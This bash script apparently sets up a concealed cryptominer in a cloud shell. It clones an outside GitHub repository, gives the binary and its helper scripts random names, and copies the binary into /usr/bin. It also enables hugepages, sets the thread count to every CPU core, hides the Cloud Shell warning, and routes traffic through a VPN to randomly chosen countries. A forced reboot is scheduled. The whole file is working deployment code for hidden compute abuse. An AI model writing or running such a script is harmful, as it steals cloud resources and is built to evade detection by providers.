#!/bin/bash
apt-get -y install sudo
sudo apt-get update -y
sudo apt-get install at -y
sudo apt-get -y install gpw;
sudo apt-get install libssl1.0.0 -y
sudo apt-get install libmicrohttpd10 -y
sudo mkdir ~/.cloudshell
sudo touch ~/.cloudshell/no-apt-get-warning
sudo apt-get install dos2unix -y
ID="$(hostname)"
THREADS=$(nproc --all)
reboot_time=$(shuf -i 10-18 -n 1)
cont_v=$(shuf -e US-C US US-M CA AT HR CY CZ DK FI FR GR HU IL IT MD NO PL GB ZA AU TR AU ID SG KR AR MX -n 1)
for i in `atq | awk '{print $1}'`;do atrm $i;done
echo 'sudo reboot -f' | at now + $reboot_time hours
timer=$(gpw 1 11)
tmpfoldername=$(gpw 1 10)
softwarename=$(gpw 1 12)
checker=$(gpw 1 8)
##################################
sudo dpkg --configure -a
if
grep --quiet vm.nr_hugepages=256 /etc/sysctl.conf; then
echo "vm.nr_hugepages already exist"
else
echo 'vm.nr_hugepages=256' | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
fi

sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir $tmpfoldername
sudo git clone https://github.com/Gaydana/Disavan.git /tmp/$tmpfoldername
cd /tmp/$tmpfoldername
sudo dos2unix /tmp/$tmpfoldername/*.sh
sudo mv /tmp/$tmpfoldername/vst /tmp/$tmpfoldername/$softwarename
sudo chmod +x /tmp/$tmpfoldername/$softwarename
sudo chmod 777 /tmp/$tmpfoldername/*.sh
sudo cp /tmp/$tmpfoldername/$softwarename /usr/bin/
##########################################################
sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/defaultTHREADS/$THREADS/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo mv /tmp/$tmpfoldername/defaulttimer.sh /tmp/$tmpfoldername/$timer.sh
sleep 3
##########################################################
sudo sed -i "s/\<tmpfoldername\>/$tmpfoldername/g" /tmp/$tmpfoldername/defaultchecker.sh
sudo sed -i "s/\<defaulttimer.sh\>/$timer.sh/g" /tmp/$tmpfoldername/defaultchecker.sh
sudo mv /tmp/$tmpfoldername/defaultchecker.sh /tmp/$tmpfoldername/$checker.sh
##########################################################
#windscribe install
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-key FDC247B7
echo 'deb https://repo.windscribe.com/ubuntu xenial main' | sudo tee /etc/apt/sources.list.d/windscribe-repo.list
sudo apt-get install apt-transport-https ca-certificates -y
sudo apt-get update
sudo apt-get install -y windscribe-cli
#windscribe connect
sudo apt-get update
sudo DEBIAN_FRONTEND=noninteractive apt-get -y -q install expect
sudo expect login.sh
sudo windscribe connect $cont_v
cont_v=$(shuf -e CA AT HR CY CZ DK FI FR GR HU IL IT MD NO PL GB ZA AU TR AU ID SG KR AR MX -n 1)
sudo windscribe connect $cont_v
cont_v=$(shuf -e CA AT HR CY CZ DK FI FR GR HU IL IT MD NO PL GB ZA AU TR AU ID SG KR AR MX -n 1)
sudo windscribe connect $cont_v
sleep 3
sudo bash /tmp/$tmpfoldername/$timer.sh && sudo bash /tmp/$tmpfoldername/$checker.sh
